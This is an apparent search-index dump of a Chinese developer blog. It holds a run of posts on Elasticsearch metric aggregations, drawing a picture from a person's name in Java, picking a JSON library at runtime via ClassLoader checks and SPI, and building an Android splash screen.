自定义聚合名 \"agg_type\": { // agg_type聚合类型， 如 min, max \"agg_body\" // 要操作的计算值 }, \"meta\": {}, \"aggregations\": {} // 子聚合查询 }} 从聚合分类来看，可以划分为下面几种 Metric Aggregation: 指标分析聚合 Bucket Aggregation: 分桶聚合 Pipeline: 管道分析类型 Matrix: 矩阵分析类型 5.1 Metric Aggregation: 指标分析聚合常见的有 min, max, avg, sum, cardinality, value count 通常是值查询一些需要通过计算获取到的值 下面分别给出一些演示说明 5.1.1 min最小值获取请求耗时最小的case 1234567891011GET second-index/_search{ \"size\": 0, \"aggs\": { \"min_cost\": { \"min\": { \"field\": \"execute.cost\" } } }} size: 0 表示不需要返回原数据 min_cost: 自定义的聚合名 min: 表示聚合类型，为取最小值 &quot;field&quot;: &quot;execute.cost&quot;: 表示取的是Field: execute.cost的最小值 5.1.2 max 最大值基本同上，下面中贴出请求代码，截图就省略掉了 1234567891011GET second-index/_search{ \"size\": 0, \"aggs\": { \"max_cost\": { \"max\": { \"field\": \"execute.cost\" } } }} 5.1.3 sum 求和1234567891011GET second-index/_search{ \"size\": 0, \"aggs\": { \"sum_cost\": { \"sum\": { \"field\": \"execute.cost\" } } }} 5.1.4 avg平均值在监控平均耗时的统计中，这个还是比较能体现服务的整体性能的 1234567891011GET second-index/_search{ \"size\": 0, \"aggs\": { \"avg_cost\": { \"avg\": { \"field\": \"execute.cost\" } } }} 5.1.5 cardinality 去重统计计数这个等同于我们常见的 distinct count 注意与后面的 value count 统计所有有值的文档数量之间的区别 1234567891011GET second-index/_search{ \"_source\": \"url\", \"aggs\": { \"cardinality_cost\": { \"cardinality\": { \"field\": \"url\" } } }} 去重统计url的计数，如下图，可以看到返回统计结果为3，但是实际的文档数有5个 5.1.6 value count 计数统计文档数量统计，区别于上面的去重统计，这里返回的是全量 1234567891011GET second-index/_search{ &quot;size&quot;: 0, &quot;aggs&quot;: { &quot;count_cost&quot;: { &quot;value_count&quot;: { &quot;field&quot;: &quot;url&quot; } } }} 输出结果配合cardinality的返回，做一个对比可以加强理解 5.1.7 stats 多值计算一个stats 可以返回上面min,max,sum...等的计算值 1234567891011GET second-index/_search{ \"size\": 0, \"aggs\": { \"mult_cost\": { \"stats\": { \"field\": \"execute.cost\" } } }} 5.1.8 extended_stats 多值扩展在上面stats的基础上进行扩展，支持方差，标准差等返回 1234567891011GET second-index/_search{ \"size\": 0, \"aggs\": { \"mult_cost\": { \"extended_stats\": { \"field\": \"execute.cost\" } } }} 5.1.9 percentile 百分位数统计 用于统计 xx% 的记录值，小于等于右边 如下面截图，可知 99%的记录，耗时小于12 默认的百分比区间是: [1, 45, 25, 50, 75, 95, 99]， 可以手动修改 1234567891011121314151617GET second-index/_search{ \"size\": 0, \"aggs\": { \"agg_cost\": { \"percentiles\": { \"field\": \"execute.cost\", \"percents\": [ 10, 50, 90, 99 ] } } }} 5.1.10 percentile rank统计值所在的区间上面用于统计不同区间的占比，比如公司的人员年龄分布；而这一个则是我想知道18岁的我，在哪个占比里 123456789101112GET second-index/_search{ &quot;size&quot;: 0, &quot;aggs&quot;: { &quot;agg_cost&quot;: { &quot;percentile_ranks&quot;: { &quot;field&quot;: &quot;execute.cost&quot;, &quot;values&quot;: [6, 9] } } }} 5.2 Bucket Aggregation 分桶聚合参考博文： ElasticSearch：aggregations 聚合详解 Elasticsearch 聚合分析深入学习 Elasticsearch: 权威指南-聚合 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2022/04/12/220412-ElasticSearch基本使用姿势二/"},{"title":"220522-程序员的浪漫：用她的名字作画","text":"hello，各位小伙伴们大家早上|中文|晚上|凌晨好，相信看这篇文章的有很多新朋友，估计也有少量的老朋友，首先做个简短的自我介绍，我是一灰灰，码农界的资深搬运工；今天呢，没有站在我身边的捧哏老师，那就只好给大伙来个单口的灌水博文了 大街上铺天盖地的520促销优惠买一赠一的宣传语，宣告了初夏的第一个特殊节日，可好巧不巧的是到了5.21号这天我才发现，居然又到了520啊，然后再一看手机，卧槽，居然过了。。。这特么回家还不得跪我那斥巨资200大洋买的机械键盘了 赶紧发动一下高达249IQ的大脑，思考一下有什么补救的措施，是时候解开封印已旧的人肉爬虫技能，看看票圈晒图的朋友们，能不能提供有价值的灵光一现 功夫终负有心人，果不其然毫无收获；老老实实的发挥一下职业特长，码农可以整些什么浪漫的活 呢？ 写个html页面，陪她去看流星雨 用她的照片组个带音乐、能自动播放的PPT 黑个商场大屏幕，附上她的美图秀秀 + 爱你一万年 AI自动写个xxx 爱你一万年的藏头诗 写个无界面的APP，偷偷装在她的手机上，设置定时弹出一朵鲜花（不怕被打的话恐怖图片也可以🤭） 可选择的不少，接下来就剩下一个小问题了，5.21号送出5.20号的小礼物能被原谅么？（请看到这里的美少女么摸着自己的良心，在评论区大声告诉我”能“ 好么） 话接上文，就算有再多得小仙女告诉我能，讲道理我也不敢信啊，接下来免费给各位看官分享一个价值99的idea，用她的名字做一幅画（如下），下面这么大的工作量，delay个一两天不很正常么（请大声告诉我，是不是很机智） 接下来，老司机教你如何使用三十行用她(他它)的名字画出她的艺术画 写了这么多居然还没有进入主题，这文章灌水得我自己都有点看不过去了😓，言归正传，接下来我们看下，如何实现用她的名字来作画呢？ 1. 作战思路目标有了，接下来就是定方案了，大家都知道计算机的世界是由0和1组成，那么图片的世界又是由什么组成呢？ 我已经听到聪明机智的小伙伴内心的答案了，对，没错，就是一个一个带有颜色的像素块 那么我们要做的是什么呢？答案已经呼之欲出了，各位少侠小仙女么，请大声告诉我好么 咳咳，说正经的，就是将将这一个一个像素块，然后用她(他它)的名字替换就行了 2. 战前准备俗话说兵马未动，粮草先行，正式开干之前，先做一些必要的准备 一张美丽动人的图片 先将背景处理一下，保留关键的人物信息，减少噪音 不会ps的小伙伴，可以直接使用 https://www.remove.bg/zh 三秒完成抠图 选择开动的技术栈，民主选择 java, php, golang, js, python? 既然如此，那我们遵循自愿原则，就决定是你了 – 爪蛙（JAVA） 3. 开战感谢各位小伙伴选择java 我的本命技能，那我们来看一下如何来实现我们的目的 步骤拆解： 读取图片 并创建一个等大的画板 遍历图片的每个像素点，读取像素点的RGB 在画板对应的位置上渲染文字 保存画板，大功告成 实现源码: 1234567891011121314151617181920212223242526272829303132public static Color int2color(int color) { int a = (0xff000000 &amp; color) &gt;&gt;&gt; 24; int r = (0x00ff0000 &amp; color) &gt;&gt; 16; int g = (0x0000ff00 &amp; color) &gt;&gt; 8; int b = (0x000000ff &amp; color); return new Color(r, g, b, a);}public void renderCharPhoto(String imgPath, String name, String saveFile) throws Exception { // 第一步，载图片 BufferedImage img = ImageIO.read(new File(imgPath)); int w = img.getWidth(), h = img.getHeight(); // 第二步，创建等大的画板 BufferedImage output = new BufferedImage(w, h, img.getType()); Graphics2D g2d = output.createGraphics(); g2d.setFont(new Font(\"宋体\", Font.PLAIN, 1)); int index = 0; for (int x = 0; x &lt; w; x++) { for (int y = 0; y &lt; h; y++) { // 第三步，遍历每个像素点，并获取对应的rgb char ch = name.charAt((index++) % name.length()); g2d.setColor(int2color(img.getRGB(x, y))); // 第四步，写上他她它的名字 g2d.drawString(String.valueOf(ch), x, y); } } // 第五步，保存图片 g2d.dispose(); ImageIO.write(output, \"png\", new File(saveFile));} 就这么简单，赶紧跑一下试试效果 好像有什么地方不对劲，这和原图没啥两样啊，那么问题出在哪呢？一个像素点上的文字，我的钛合金四眼看不见啊，那可以怎么办呢？ 有道理，把图片放大，不就ok了么，那么将上面的画板调整一下，放大24倍，设置字体大小20，给字与字之间留点空隙 12345678910111213141516171819public void renderCharPhoto(String imgPath, String name, String saveFile) throws Exception { BufferedImage img = ImageIO.read(new File(imgPath)); int w = img.getWidth(), h = img.getHeight(); BufferedImage output = new BufferedImage(w * 24, h * 24, img.getType()); Graphics2D g2d = output.createGraphics(); g2d.setFont(new Font(\"宋体\", Font.PLAIN, 20)); int index = 0; for (int x = 0; x &lt; w; x++) { for (int y = 0; y &lt; h; y++) { char ch = name.charAt((index++) % name.length()); g2d.setColor(int2color(img.getRGB(x, y))); g2d.drawString(String.valueOf(ch), x * 24 + 2, y * 24 + 2); } } g2d.dispose(); ImageIO.write(output, \"png\", new File(saveFile));} 这标准的宋体好像暴露了什么，要是告诉他(她它）这是手绘的，能信么？ 为了更逼真一点，换个手绘字体试一试，网上搜索一下，从这里 https://www.diyiziti.com/Builder/446 下载了一个 潇洒手写体资源 然后再调整一下上面代码中的字体设置 123456789101112131415161718192021222324public void renderCharPhoto(String imgPath, String name, String saveFile) throws Exception { BufferedImage img = ImageIO.read(new File(imgPath)); int w = img.getWidth(), h = img.getHeight(); BufferedImage output = new BufferedImage(w * 24, h * 24, img.getType()); Graphics2D g2d = output.createGraphics(); // 使用自定义的字体 try (InputStream inputStream = Files.newInputStream(Paths.get(\"D://MobileFile/潇洒手写体.ttf\"))) { Font font = Font.createFont(Font.TRUETYPE_FONT, inputStream); g2d.setFont(font.deriveFont(Font.PLAIN, 20)); } int index = 0; for (int x = 0; x &lt; w; x++) { for (int y = 0; y &lt; h; y++) { char ch = name.charAt((index++) % name.length()); g2d.setColor(int2color(img.getRGB(x, y))); g2d.drawString(String.valueOf(ch), x * 24 + 2, y * 24 + 2); } } g2d.dispose(); ImageIO.write(output, \"png\", new File(saveFile));} 如果对方很熟悉你的字体怎么办？ 解决办法也有，应用商店搜索一下”造字”，还可以顺便给自己打造一个独一无二的字体 棒，这下感觉无懈可击了啊，只要把上面的图片找个打印店，彩绘一下，完事了啊；拿走，不谢 如果不幸的是，当你有个机智的对象时，那么她/他/它多半会给你灵魂一问，你是如何做到，字和间距都分毫不差的？ 最后叨叨了这么久，忽然想到一个问题，看到这里的单身小伙伴们，话说你们是出于啥心里继续看完的，520这个节日，和你们这些单身狗有什么关系呢😏 4. 战后福利上面三十行代码手把手教你实现了一个哄(糊弄)女票的方法，基本功能还是很完整的，当然如此贴心的一灰灰我，也给各位小伙伴提供了更友好的方式，如直接从网上加载图片、字体 123456789101112131415161718192021public void testCharPicture() throws Exception { prefix = \"/tmp/\"; String img = \"http://hbimg.b0.upaiyun.com/2b79e7e15883d8f8bbae0b1d1efd6cf2c0c1ed1b10753-cusHEA_fw236\"; ImgPixelWrapper.build() .setSourceImg(img) .setChars(\"小黄人\") // 字体文件下载地址: https://www.diyiziti.com/Builder/446 .setFontName(\"https://font.js.live/front/font/download?id=446\") .setBlockSize(24) .setFontSize(22) .setBgPredicate(color -&gt; { // 指定背景色，不渲染文本 if (color == 0) return true; Color rc = ColorUtil.int2color(color); // 将白色当作背景色 return rc.getRed() &gt;= 245 &amp;&amp; rc.getGreen() &gt;= 245 &amp;&amp; rc.getBlue() &gt;= 245; }) .setPixelType(PixelStyleEnum.CHAR_SEQ_SCALE_UP) .build().asFile(prefix + \"/char_pic_xhr.jpg\"); System.out.println(\"---- over ---\");} 对应的源码： https://github.com/liuyueyi/quick-media 引入方式也很简单 123&lt;artifactId&gt;image-plugin&lt;/artifactId&gt;&lt;groupId&gt;com.github.liuyueyi.media&lt;/groupId&gt;&lt;version&gt;2.6.4&lt;/version&gt; 是不是很贴心，是不是很感动，是不是应该点个赞、给个评论支持，加个收藏下次备用呢 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2022/05/22/220522-程序员的浪漫：用她的名字作画/"},{"title":"220824-基于引入包选择具体实现类的使用姿势小结","text":"最近遇到一个需求场景，开源的工具包，新增了一个高级特性，会依赖json序列化工具，来做一些特殊操作；但是，这个辅助功能并不是必须的，也就是说对于使用这个工具包的业务方而言，正常使用完全不需要json相关的功能；如果我强引用某个json工具，一是对于不适用高级特性的用户而言没有必要；二则是我引入的json工具极有可能与使用者的不一致，会增加使用者的成本 因此我希望这个工具包对外提供时，并不会引入具体的json工具依赖；也就是说maven依赖中的&lt;scope&gt;设置为provided；具体的json序列化的实现，则取决于调用方自身引入了什么json工具包 那么可以怎么实现上面这个方式呢？ 1. 任务说明上面的简单的说了一下我们需要做的事情，接下来我们重点盘一下，我们到底是要干什么 核心诉求相对清晰 不强引入某个json工具 若需要使用高级特性，则直接使用当前环境中已集成的json序列化工具；若没有提供，则抛异常，不支持 对于上面这个场景，常年使用Spring的我们估计不会陌生，Spring集成了很多的第三方开源组件，根据具体的依赖来选择最终的实现，比如日志，可以是logback，也可以是log4j；比如redis操作，可以是jedis，也可以是lettuce 那么Spring是怎么实现的呢？ 2.具体实现在Spring中有个注解名为ConditionalOnClass，表示当某个类存在时，才会干某些事情（如初始化bean对象） 它是怎么是实现的呢？（感兴趣的小伙伴可以搜索一下，或者重点关注下 SpringBootCondition 的实现） 这里且抛开Spring的实现姿势，我们采用传统的实现方式，直接判断是否有加载对应的类，来判断有没有引入相应的工具包 如需要判断是否引入了gson包，则判断ClassLoader是否有加载com.google.gson.Gson类 1234567public static boolean exist(String name) { try { return JsonUtil.class.getClassLoader().loadClass(name) != null; } catch (Exception e) { return false; }} 上面这种实现方式就可以达到我们的效果了；接下来我们参考下Spring的ClassUtils实现，做一个简单的封装，以判断是否存在某个类 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120// 这段代码来自Spring// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//import java.lang.reflect.Array;import java.util.HashMap;import java.util.Map;/** * @author Spring */public abstract class ClassUtils { private static final Map&lt;String, Class&lt;?&gt;&gt; primitiveTypeNameMap = new HashMap(32); private static final Map&lt;String, Class&lt;?&gt;&gt; commonClassCache = new HashMap(64); private ClassUtils() { } public static boolean isPresent(String className) { try { forName(className, getDefaultClassLoader()); return true; } catch (IllegalAccessError var3) { throw new IllegalStateException(\"Readability mismatch in inheritance hierarchy of class [\" + className + \"]: \" + var3.getMessage(), var3); } catch (Throwable var4) { return false; } } public static boolean isPresent(String className, ClassLoader classLoader) { try { forName(className, classLoader); return true; } catch (IllegalAccessError var3) { throw new IllegalStateException(\"Readability mismatch in inheritance hierarchy of class [\" + className + \"]: \" + var3.getMessage(), var3); } catch (Throwable var4) { return false; } } public static Class&lt;?&gt; forName(String name, ClassLoader classLoader) throws ClassNotFoundException, LinkageError { Class&lt;?&gt; clazz = resolvePrimitiveClassName(name); if (clazz == null) { clazz = (Class) commonClassCache.get(name); } if (clazz != null) { return clazz; } else { Class elementClass; String elementName; if (name.endsWith(\"[]\")) { elementName = name.substring(0, name.length() - \"[]\".length()); elementClass = forName(elementName, classLoader); return Array.newInstance(elementClass, 0).getClass(); } else if (name.startsWith(\"[L\") &amp;&amp; name.endsWith(\";\")) { elementName = name.substring(\"[L\".length(), name.length() - 1); elementClass = forName(elementName, classLoader); return Array.newInstance(elementClass, 0).getClass(); } else if (name.startsWith(\"[\")) { elementName = name.substring(\"[\".length()); elementClass = forName(elementName, classLoader); return Array.newInstance(elementClass, 0).getClass(); } else { ClassLoader clToUse = classLoader; if (classLoader == null) { clToUse = getDefaultClassLoader(); } try { return Class.forName(name, false, clToUse); } catch (ClassNotFoundException var9) { int lastDotIndex = name.lastIndexOf(46); if (lastDotIndex != -1) { String innerClassName = name.substring(0, lastDotIndex) + '$' + name.substring(lastDotIndex + 1); try { return Class.forName(innerClassName, false, clToUse); } catch (ClassNotFoundException var8) { } } throw var9; } } } } public static Class&lt;?&gt; resolvePrimitiveClassName(String name) { Class&lt;?&gt; result = null; if (name != null &amp;&amp; name.length() &lt;= 8) { result = (Class) primitiveTypeNameMap.get(name); } return result; } public static ClassLoader getDefaultClassLoader() { ClassLoader cl = null; try { cl = Thread.currentThread().getContextClassLoader(); } catch (Throwable var3) { } if (cl == null) { cl = ClassUtils.class.getClassLoader(); if (cl == null) { try { cl = ClassLoader.getSystemClassLoader(); } catch (Throwable var2) { } } } return cl; }} 工具类存在之后，我们实现一个简单的json工具类，根据已有的json包来选择具体的实现 123456789101112131415161718192021222324252627282930313233343536373839public class JsonUtil { private static JsonApi jsonApi; private static void initJsonApi() { if (jsonApi == null) { synchronized (JsonUtil.class) { if (jsonApi == null) { if (ClassUtils.isPresent(\"com.fasterxml.jackson.databind.ObjectMapper\", JsonUtil.class.getClassLoader())) { jsonApi = new JacksonImpl(); } else if (ClassUtils.isPresent(\"com.google.gson.Gson\", JsonUtil.class.getClassLoader())) { jsonApi = new GsonImpl(); } else if (ClassUtils.isPresent(\"com.alibaba.fastjson.JSONObject\", JsonUtil.class.getClassLoader())) { jsonApi = new JacksonImpl(); } else { throw new UnsupportedOperationException(\"no json framework to deserialize string! please import jackson|gson|fastjson\"); } } } } } /** * json转实体类，会根据当前已有的json框架来执行反序列化 * * @param str * @param t * @param &lt;T&gt; * @return */ public static &lt;T&gt; T toObj(String str, Class&lt;T&gt; t) { initJsonApi(); return jsonApi.toObj(str, t); } public static &lt;T&gt; String toStr(T t) { initJsonApi(); return jsonApi.toStr(t); }} 上面的实现中，根据已有的json序列化工具，选择具体的实现类，我们定义了一个JsonApi接口，然后分别gson,jackson,fastjson给出默认的实现类 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748public interface JsonApi { &lt;T&gt; T toObj(String str, Class&lt;T&gt; clz); &lt;T&gt; String toStr(T t);}public class FastjsonImpl implements JsonApi { public &lt;T&gt; T toObj(String str, Class&lt;T&gt; clz) { return JSONObject.parseObject(str, clz); } public &lt;T&gt; String toStr(T t) { return JSONObject.toJSONString(t); }}public class GsonImpl implements JsonApi { private static final Gson gson = new Gson(); public &lt;T&gt; T toObj(String str, Class&lt;T&gt; t) { return gson.fromJson(str, t); } public &lt;T&gt; String toStr(T t) { return gson.toJson(t); }}public class JacksonImpl implements JsonApi{ private static final ObjectMapper jsonMapper = new ObjectMapper(); public &lt;T&gt; T toObj(String str, Class&lt;T&gt; clz) { try { return jsonMapper.readValue(str, clz); } catch (Exception e) { throw new UnsupportedOperationException(e); } } public &lt;T&gt; String toStr(T t) { try { return jsonMapper.writeValueAsString(t); } catch (Exception e) { throw new UnsupportedOperationException(e); } }} 最后的问题来了，如果调用方并没有使用上面三个序列化工具，而是使用其他的呢，可以支持么？ 既然我们定义了一个JsonApi，那么是不是可以由用户自己来实现接口，然后自动选择它呢？ 现在的问题就是如何找到用户自定义的接口实现了 3. 扩展机制对于SPI机制比较熟悉的小伙伴可能非常清楚，可以通过在配置目录META-INF/services/下新增接口文件，内容为实现类的全路径名称，然后通过 ServiceLoader.load(JsonApi.class) 的方式来获取所有实现类 除了SPI的实现方式之外，另外一个策略则是上面提到的Spring的实现原理，借助字节码来处理（详情原理后面专文说明） 当然也有更容易想到的策略，扫描包路径下的class文件，遍历判断是否为实现类(额外注意jar包内的实现类场景) 接下来以SPI的方式来介绍下扩展实现方式，首先初始化JsonApi的方式改一下，优先使用用户自定义实现 1234567891011121314151617181920212223private static void initJsonApi() { if (jsonApi == null) { synchronized (JsonUtil.class) { if (jsonApi == null) { ServiceLoader&lt;JsonApi&gt; loader = ServiceLoader.load(JsonApi.class); for (JsonApi value : loader) { jsonApi = value; return; } if (ClassUtils.isPresent(\"com.fasterxml.jackson.databind.ObjectMapper\", JsonUtil.class.getClassLoader())) { jsonApi = new JacksonImpl(); } else if (ClassUtils.isPresent(\"com.google.gson.Gson\", JsonUtil.class.getClassLoader())) { jsonApi = new GsonImpl(); } else if (ClassUtils.isPresent(\"com.alibaba.fastjson.JSONObject\", JsonUtil.class.getClassLoader())) { jsonApi = new JacksonImpl(); } else{ throw new UnsupportedOperationException(\"no json framework to deserialize string! please import jackson|gson|fastjson\"); } } } }} 对于使用者而言，首先是实现接口 123456789101112131415package com.github.hui.quick.plugin.test;import com.github.hui.quick.plugin.qrcode.util.json.JsonApi;public class DemoJsonImpl implements JsonApi { @Override public &lt;T&gt; T toObj(String str, Class&lt;T&gt; clz) { // ... } @Override public &lt;T&gt; String toStr(T t) { // ... }} 接着就是实现定义, resources/META-INF/services/ 目录下，新建文件名为 com.github.hui.quick.plugin.qrcode.util.json.JsonApi 内容如下 1com.github.hui.quick.plugin.test.DemoJsonImpl 然后完工~ 4. 小结主要介绍一个小的知识点，如何根据应用已有的jar包来选择具体的实现类的方式；本文介绍的方案是通过ClassLoader来尝试加载对应的类，若能正常加载，则认为有；否则认为没有；这种实现方式虽然非常简单，但是请注意，它是有缺陷的，至于缺陷是啥… 除此之外，也可以考虑通过字节码的方式来判断是否有某个类，或者获取某个接口的实现；文中最后抛出了一个问题，如何获取接口的所有实现类 常见的方式有下面三类（具体介绍了SPI的实现姿势，其他的两种感兴趣的可以搜索一下） SPI定义方式 扫描包路径 字节码方式(如Spring，如Tomcat的@HandlesTypes) 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2022/08/24/220824-基于引入包选择具体实现类的使用姿势小结/"},{"title":"Android学习之旅1D:首屏页的开发","text":"Android学习之旅：第一天 采用依葫芦画瓢的方式来学习android的开发，准备逐步的开发出《一封》这个app 本片主要记录了SplashActivity的开发过程 I. 前置主要copy两个开源项目 JianshuApp SUESNews 上面两个工程，第二个用到的依赖比较少，实现的基本功能也都很ok，而第一个里面则用了很多有意思的第三方框架，但是目前我看不太懂，所以第一版以SUESNews作为主要的学习目标 所以，第一版的目标是： 实现基本功能 完成主体业务逻辑 II. Splash页面开发一般来将，进入app之前，会进入一个类似首屏页的页面（比如12306的显示广告啥的），那么第一件事情就是做这个了 1. 做什么这个页面，主要显示的东西比较简单了 上边是一个图片，右上角一个倒计时 下边显示的应用信息，版本等 业务逻辑： 显示广告（😄），点击进入相应的详情页 判断是否登录，若未登录，则进入登录页 若已经登录，则进入主APP 2. 开动a. 全屏进入的首页，所以状态栏，标题啥的都不要，主要的逻辑如下 styles.xml 文件中新增 1234&lt;style name=\"AppTheme.FullScreen\"&gt; &lt;item name=\"windowNoTitle\"&gt;true&lt;/item&gt; &lt;item name=\"android:windowFullscreen\"&gt;true&lt;/item&gt;&lt;/style&gt; 其次，就是在定义的Activity中，使用对应的style AndroidManifest.xml 1234567&lt;activity android:name=\".ui.SplashActivity\" android:theme=\"@style/AppTheme.FullScreen\"&gt; &lt;intent-filter&gt; &lt;action android:name=\"android.intent.action.MAIN\" /&gt; &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt; &lt;/intent-filter&gt;&lt;/activity&gt; b. xml实现activity_splash.xml 对应的实现如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;RelativeLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" xmlns:tools=\"http://schemas.android.com/tools\" android:id=\"@+id/content\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:fitsSystemWindows=\"false\" tools:context=\"com.yihui.yifeng.ui.SplashActivity\"&gt; &lt;ImageView android:id=\"@+id/image_background\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:layout_alignBottom=\"@+id/title_text\" android:layout_alignParentLeft=\"true\" android:layout_alignParentStart=\"true\" android:layout_marginBottom=\"52dp\" android:scaleType=\"centerCrop\" /&gt; &lt;ImageView android:id=\"@+id/image_info_bg\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:layout_alignTop=\"@+id/title_text\" android:layout_centerHorizontal=\"true\" android:scaleType=\"centerCrop\" /&gt; &lt;TextView android:id=\"@+id/title_text\" android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:layout_above=\"@+id/version_text\" android:layout_centerHorizontal=\"true\" android:layout_marginBottom=\"17dp\" android:text=\"@string/app_name\" android:textColor=\"@color/text_color\" android:textSize=\"@dimen/text_size_title_bigger\" android:textStyle=\"bold\" /&gt; &lt;TextView android:id=\"@+id/version_text\" android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:layout_alignParentBottom=\"true\" android:layout_centerHorizontal=\"true\" android:layout_marginBottom=\"11dp\" android:textColor=\"@color/secondary_text\" android:textSize=\"@dimen/text_size_subhead\" android:textStyle=\"bold\" tools:text=\"Copyright @2017-2018 一封 | 小灰灰技术支持\" /&gt;&lt;/RelativeLayout&gt; 运行截图如下： 上面这个布局，是直接使用可视化的拖拽的，所以操作起来挺蛋疼的，而且最终的结果也不太好，下面单独的开一节来研究下这个布局的东西了 c. Activity的实现上面是xml的配置，当然还得有对应的实体类了，大部分逻辑是直接从参考的工程中copy过来的，所以相关的动画配置，图片也是直接扣过来的 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263public class SplashActivity extends Activity { private ImageView mBackgroundImage; private ImageView infoBgImg; private TextView mTitleText; private TextView mVersionText; private int[] ary = new int[] {R.drawable.pic_background_1, R.drawable.pic_background_2, R.drawable.pic_background_3, R.drawable.pic_background_4}; private int getBgDrawable() { return ary[new Random().nextInt(ary.length)]; } private void initInfoBg() { infoBgImg = findViewById(R.id.image_info_bg); infoBgImg.setImageDrawable(getResources().getDrawable(ary[0])); } private void initAdBg() { mBackgroundImage = findViewById(R.id.image_background); mBackgroundImage.setImageDrawable(getResources().getDrawable(getBgDrawable())); Animation animImage = AnimationUtils.loadAnimation(this, R.anim.image_welcome); mBackgroundImage.startAnimation(animImage); animImage.setAnimationListener(new Animation.AnimationListener() { @Override public void onAnimationStart(Animation animation) { } @Override public void onAnimationEnd(Animation animation) { //动画结束时打开首页 startActivity(new Intent(SplashActivity.this, MainActivity.class)); overridePendingTransition(R.anim.activity_slide_in, R.anim.no_anim); finish(); } @Override public void onAnimationRepeat(Animation animation) { } }); } @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_splash); // 下半的提示文案信息 initInfoBg(); // 上半的广告动画 initAdBg(); }} todo登录状态判断，如果未登录，则应该跳转到登录页面；否则才是跳转到主页 III. 知识点小结上面只是实现了一个简单的应用开启页面，但也涉及了几个有趣的知识点，下面来深入一下 1. RelativeLayout 布局控件的位置是按照相对位置来计算的，后一个控件在什么位置依赖于前一个控件的基本位置，是布局最常用，也是最灵活的一种布局 常见的属性值 123456789101112131415161718192021222324第一类:属性值为true或falseandroid:layout_centerHrizontal 水平居中android:layout_centerVertical 垂直居中android:layout_centerInparent 相对于父元素完全居中android:layout_alignParentBottom 贴紧父元素的下边缘android:layout_alignParentLeft 贴紧父元素的左边缘android:layout_alignParentRight 贴紧父元素的右边缘android:layout_alignParentTop 贴紧父元素的上边缘 第二类：属性值必须为id的引用名“@id/id-name”android:layout_below 在某元素的下方android:layout_above 在某元素的的上方android:layout_toLeftOf 在某元素的左边android:layout_toRightOf 在某元素的右边android:layout_alignTop 本元素的上边缘和某元素的的上边缘对齐android:layout_alignLeft 本元素的左边缘和某元素的的左边缘对齐android:layout_alignBottom 本元素的下边缘和某元素的的下边缘对齐android:layout_alignRight 本元素的右边缘和某元素的的右边缘对齐第三类：属性值为具体的像素值，如30dip，40pxandroid:layout_marginBottom 离某元素底边缘的距离android:layout_marginLeft 离某元素左边缘的距离android:layout_marginRight 离某元素右边缘的距离android:layout_marginTop 离某元素上边缘的距离 所以可以简单的修改一下上面的布局，相对布局的样式就两个，上面一个图，下面一个图 1234567891011121314151617181920&lt;ImageView android:id=\"@+id/image_background\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" &lt;!-- 注意这一行 --&gt; android:layout_alignBottom=\"@+id/image_info_bg\" android:layout_alignParentLeft=\"true\" android:layout_alignParentStart=\"true\" android:layout_marginBottom=\"52dp\" android:scaleType=\"centerCrop\" /&gt;&lt;ImageView android:id=\"@+id/image_info_bg\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" &lt;!-- 注意这一行，确保背景图可以包含文本信息 --&gt; android:layout_alignTop=\"@+id/title_text\" android:layout_centerHorizontal=\"true\" android:scaleType=\"centerCrop\" /&gt; 那么剩下的两个文本显示就可以直接指定下边距来确定位置了 123456789101112131415161718192021222324&lt;TextView android:id=\"@+id/title_text\" android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:layout_above=\"@+id/version_text\" android:layout_centerHorizontal=\"true\" &lt;!-- 这里确定了高度 --&gt; android:layout_marginBottom=\"17dp\" android:text=\"@string/app_name\" android:textColor=\"@color/text_color\" android:textSize=\"@dimen/text_size_title_bigger\" android:textStyle=\"bold\" /&gt;&lt;TextView android:id=\"@+id/version_text\" android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:layout_alignParentBottom=\"true\" android:layout_centerHorizontal=\"true\" &lt;!-- 这里确定了高度 --&gt; android:layout_marginBottom=\"11dp\" android:textColor=\"@color/secondary_text\" android:textSize=\"@dimen/text_size_subhead\" android:text=\"@string/splash_copyright\" /&gt; 2. 获取组件在Activity中，先要绑定视图，然后再获取view进行相关的操作（如修改值，绑定事件等） 12345678910// Activity 的 oncreate方法中，进行初始化// 绑定视图super.onCreate(savedInstanceState);setContentView(R.layout.activity_splash);// 获取组件findViewById(R.id.image_info_bg);// 获取资源，如图片Drawable drawable = getResources().getDrawable(R.drawable.pic_background_1) 有一个非常有名的工具叫做 butterknife, 可以通过注解的方式来解决 findViewById这种频繁的调用姿势，这个放在后续的进阶版中使用 3. 